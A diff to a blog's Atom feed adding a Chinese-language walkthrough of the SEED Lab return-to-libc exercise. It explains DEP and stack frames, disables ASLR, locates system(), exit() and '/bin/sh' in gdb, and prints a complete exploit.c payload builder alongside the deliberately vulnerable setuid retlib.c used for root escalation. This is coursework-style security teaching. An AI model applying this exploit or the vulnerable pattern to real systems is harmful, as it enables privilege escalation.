@@ -5,7 +5,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="http://bin2415.github.io/"/>
-  <updated>2017-05-16T08:58:52.197Z</updated>
+  <updated>2017-05-16T09:03:57.389Z</updated>
   <id>http://bin2415.github.io/</id>
   
   <author>
@@ -14,6 +14,60 @@
   </author>
   
   <generator uri="http://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>seed-returnToLibc</title>
+    <link href="http://bin2415.github.io/2017/05/16/seed-returnToLibc/"/>
+    <id>http://bin2415.github.io/2017/05/16/seed-returnToLibc/</id>
+    <published>2017-05-16T09:01:27.000Z</published>
+    <updated>2017-05-16T09:03:57.389Z</updated>
+    
+    <content type="html"><![CDATA[<h3 id="声明"><a href="#声明" class="headerlink" title="声明"></a>声明</h3><h2 id="该教程是根据Seed-Lab-return-to-libc的实验要求所写的，该教程只是演示了一下return-to-libc的一些基本的攻击原理，由于关了编译器及系统的一些保护措施，所以并不能在实际的情况下实现攻击-′▽-〃"><a href="#该教程是根据Seed-Lab-return-to-libc的实验要求所写的，该教程只是演示了一下return-to-libc的一些基本的攻击原理，由于关了编译器及系统的一些保护措施，所以并不能在实际的情况下实现攻击-′▽-〃" class="headerlink" title="该教程是根据Seed Lab: return-to-libc的实验要求所写的，该教程只是演示了一下return-to-libc的一些基本的攻击原理，由于关了编译器及系统的一些保护措施，所以并不能在实际的情况下实现攻击(′▽`〃)"></a>该教程是根据<a href="http://www.cis.syr.edu/~wedu/seed/Labs_12.04/Software/Return_to_libc/" target="_blank" rel="external">Seed Lab: return-to-libc</a>的实验要求所写的，该教程只是演示了一下return-to-libc的一些基本的攻击原理，由于关了编译器及系统的一些保护措施，所以并不能在实际的情况下实现攻击(′▽`〃)</h2><h3 id="一：背景介绍"><a href="#一：背景介绍" class="headerlink" title="一：背景介绍"></a>一：背景介绍</h3><h4 id="DEP数据执行保护"><a href="#DEP数据执行保护" class="headerlink" title="DEP数据执行保护"></a>DEP数据执行保护</h4><p>  溢出攻击的根源在于现代计算机对数据和代码没有明确区分这一先天缺陷，就目前来看重新去设计计算机体系结构基本上是不可能的，我们只能靠向前兼容的修补来减少溢出带来的损害，DEP（数据执行保护，Data Execution Prevention）就是用来弥补计算机对数据和代码混淆这一天然缺陷的。DEP的基本原理是将数据所在内存页标识为不可执行，当程序溢出成功转入shellcode时，程序会尝试在数据页面上执行指令，此时CPU就会抛出异常，而不是去执行恶意指令。DEP 的主要作用是阻止数据页（如默认的堆页、各种堆栈页以及内存池页）执行代码。所以一般的将shellcode存放到栈中并将shellcode执行的方式在这种机制中是不可行的。</p>
+<p>  在Linux中，通常在编译的时候添加 -fno-stack-protector -z noexecstack 编译选项就会开启该模式，在该模式下，不能像以前的攻击将恶意代码overflow进栈中，并将return地址指向恶意代码开始处，在这种情况下应该借用系统库的调用从而达到提权等目的。</p>
+<h4 id="Return-to-libc原理"><a href="#Return-to-libc原理" class="headerlink" title="Return-to-libc原理"></a>Return-to-libc原理</h4><p>   Return-into-libc 攻击可以将漏洞函数返回到内存空间已有的动态库函数中。而为了理解 return-into-libc 攻击，这里首先给出程序函数调用过程中栈帧的结构。</p>
+<p>   图 1.函数调用时栈帧的结构：</p>
+<p>  <img src="http://i.imgur.com/HE3Xv98.png" alt=""></p>
+<p>   图 1 给出了一个典型的函数调用时的栈帧结构，该栈从高位地址向低位地址增长。每当一个函数调用另一个函数向低地址方向压栈，而当函数返回时向高地址方向清栈。例如，当 main() 调用 func(arg_1,arg_2,arg_3) 时，首先将所有参数arg_1,arg_2 和 arg_3入栈。图 1 中参数从右向左依次被压入栈中，这是因为 C 语言中函数传参是从右向左压栈的。然后，call 指令会将返回地址压栈，并使执行流转到 func()。返回地址是 call 指令的下一条指令的地址，这个用于告知 func ()函数返回后从 main()函数的哪条指令开始执行。进入 func 函数后，通常需要将 main()函数的栈底指针 ebp 保存到栈中并将当前的栈顶指针 esp 保存在 ebp 中作为 func 的栈底。接下来，func 函数会在栈中为局部变量等分配空间。因此，调用函数 func()时的栈帧结构如图 1 所示。<br>   而当 func()执行完成返回时 leave 指令将 ebp 拷贝到 esp 中清空局部变量在栈中的区域，然后从堆栈中弹出老 ebp 放回 ebp 寄存器使 ebp 恢复为 main()函数的栈底。然后 ret 指令从栈中获取返回地址，返回到 main()函数中继续执行。</p>
+<p>   攻击者可以利用栈中的内容实施 return-into-libc 攻击。这是因为攻击者能够通过缓冲区溢出改写返回地址为一个库函数的地址，并且将此库函数执行时的参数也重新写入栈中。这样当函数调用时获取的是攻击者设定好的参数值，并且结束后返回时就会返回到库函数而不是 main()。而此库函数实际上就帮助攻击者执行了其恶意行为。更复杂的攻击还可以通过 return-into-libc 的调用链（一系列库函数的连续调用）来完成。</p>
+<h3 id="二：实验部分"><a href="#二：实验部分" class="headerlink" title="二：实验部分"></a>二：实验部分</h3><h4 id="获得system-和exit-的地址"><a href="#获得system-和exit-的地址" class="headerlink" title="获得system()和exit()的地址"></a>获得system()和exit()的地址</h4><p>由于在实验开始就执行了 sysctl -w kernel.randomize_va_space=0 命令，该命令用来将系统的ASLR（地址随机化机制）关闭，所以在每次将libc.so库加载到内存中时，system()和exit()的地址都是一样的。所以就gdb调试retlib程序，在main出设置断点，并运行，程序会在main的入口处停下，然后执行p system,和p exit就能将system和exit在内存中的地址打印出来。</p>
+<p>具体操作如图2所示：</p>
+<p><img src="http://i.imgur.com/Rc0pUVy.png" alt=""></p>
+<p>由该图可知，函数system()和exit()的地址分别为0xb7e5f430和0xb7e52fb0。</p>
+<h4 id="获得”-bin-sh”字符串地址"><a href="#获得”-bin-sh”字符串地址" class="headerlink" title="获得”/bin/sh”字符串地址"></a>获得”/bin/sh”字符串地址</h4><p>获得字符串的地址主要有两种方法:其中第一个是在libc.so中找到字符串地址，第二个方法是将/bin/sh字符串放到环境变量中去</p>
+<ol>
+<li>由于libc.so的地址是固定的，所以在libc.so的”/bin/sh”字符串的地址也是固定的，所以可以在gdb调试的时候用find指定找到一个/bin/sh字符串的地址，具体方法如图3所示：<br><img src="http://i.imgur.com/qkflPn4.png" alt=""></li>
+<li>首先export MYSHELL = /bin/sh,然后编写程序获得名为MYSHELL环境变量的地址，将其输出即可，输出结果如图4所示：</li>
+</ol>
+<h4 id="获得buffer要return的地址偏移"><a href="#获得buffer要return的地址偏移" class="headerlink" title="获得buffer要return的地址偏移"></a>获得buffer要return的地址偏移</h4><p>首先构造一个从A-Z和从a-z的badfile文件，然后gdb retlib，run，就会出现栈溢出，找出栈溢出的地址为如图5所示</p>
+<p><img src="http://i.imgur.com/RHD2w3J.png" alt=""></p>
+<p>0x62615a59代表的char为baZY，因为它是大端法表示的，所以为YZab，在地buffer的24-27偏移处。所以X为24。</p>
+<p>由图1可知道栈的结构，即return地址的下面4个字节为要返回的下个地址指针，再下面4个字节为函数参数，所以24+4=28处存取exit()的函数，24+8=32出存取/bin/sh字符串的地址</p>
+<h4 id="编写exploit程序"><a href="#编写exploit程序" class="headerlink" title="编写exploit程序"></a>编写exploit程序</h4><p>所以exploit.c的程序如下所示:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div></pre></td><td class="code"><pre><div class="line">#include &lt;stdlib.h&gt;</div><div class="line">#include &lt;stdio.h&gt;</div><div class="line">#include &lt;string.h&gt;</div><div class="line">int main(int argc, char **argv)</div><div class="line">&#123;</div><div class="line">  char buf[40];</div><div class="line">  FILE *badfile;</div><div class="line"></div><div class="line">  badfile = fopen(&quot;./badfile&quot;, &quot;w&quot;);</div><div class="line">  int i;</div><div class="line">  for(i = 0;i &lt; 40;i++)</div><div class="line"> buf[i] = 0x90;</div><div class="line"></div><div class="line">  /* You need to decide the addresses and </div><div class="line"> the values for X, Y, Z. The order of the following </div><div class="line"> three statements does not imply the order of X, Y, Z.</div><div class="line"> Actually, we intentionally scrambled the order. */</div><div class="line">  *(long *) &amp;buf[32] = 0xb7f80fb8 ;   //  &quot;/bin/sh&quot;</div><div class="line">  *(long *) &amp;buf[24] = 0xb7e5f430 ;   //  system()</div><div class="line">  *(long *) &amp;buf[28] = 0xb7e52fb0 ;   //  exit()</div><div class="line"></div><div class="line">  fwrite(buf, sizeof(buf), 1, badfile);</div><div class="line">  fclose(badfile);</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<p>在前面步骤获得了system()，exit()和/bin/sh在内存的地址，以及return在buffer的偏移地址，所以可以按照上面获得的信息来补全exploit.c的程序。</p>
+<p>retlib.c程序:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div></pre></td><td class="code"><pre><div class="line">/* This program has a buffer overflow vulnerability. */</div><div class="line">/* Our task is to exploit this vulnerability */</div><div class="line">#include &lt;stdlib.h&gt;</div><div class="line">#include &lt;stdio.h&gt;</div><div class="line">#include &lt;string.h&gt;</div><div class="line"></div><div class="line">int bof(FILE *badfile)</div><div class="line">&#123;</div><div class="line">char buffer[12];</div><div class="line"></div><div class="line">/* The following statement has a buffer overflow problem */</div><div class="line">fread(buffer, sizeof(char), 40, badfile);</div><div class="line"></div><div class="line">return 1;</div><div class="line">&#125;</div><div class="line"></div><div class="line">int main(int argc, char **argv)</div><div class="line">&#123;</div><div class="line">FILE *badfile;</div><div class="line"></div><div class="line">badfile = fopen(&quot;badfile&quot;, &quot;r&quot;);</div><div class="line">bof(badfile);</div><div class="line"></div><div class="line">printf(&quot;Returned Properly\n&quot;);</div><div class="line"></div><div class="line">fclose(badfile);</div><div class="line">return 1;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<p>在编译retlib.c程序时，用root权限编译，这样在运行/bin/sh程序时即可提权。</p>
+<p>提权结果如下：</p>
+<p><img src="http://i.imgur.com/CFdjcrV.png" alt=""></p>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;h3 id=&quot;声明&quot;&gt;&lt;a href=&quot;#声明&quot; class=&quot;headerlink&quot; title=&quot;声明&quot;&gt;&lt;/a&gt;声明&lt;/h3&gt;&lt;h2 id=&quot;该教程是根据Seed-Lab-return-to-libc的实验要求所写的，该教程只是演示了一下return-to-libc的一些
+    
+    </summary>
+    
+      <category term="反汇编" scheme="http://bin2415.github.io/categories/%E5%8F%8D%E6%B1%87%E7%BC%96/"/>
+    
+    
+      <category term="反汇编" scheme="http://bin2415.github.io/tags/%E5%8F%8D%E6%B1%87%E7%BC%96/"/>
+    
+      <category term="seed" scheme="http://bin2415.github.io/tags/seed/"/>
+    
+      <category term="exploit" scheme="http://bin2415.github.io/tags/exploit/"/>
+    
+  </entry>
   
   <entry>
     <title>open_Rebort</title>
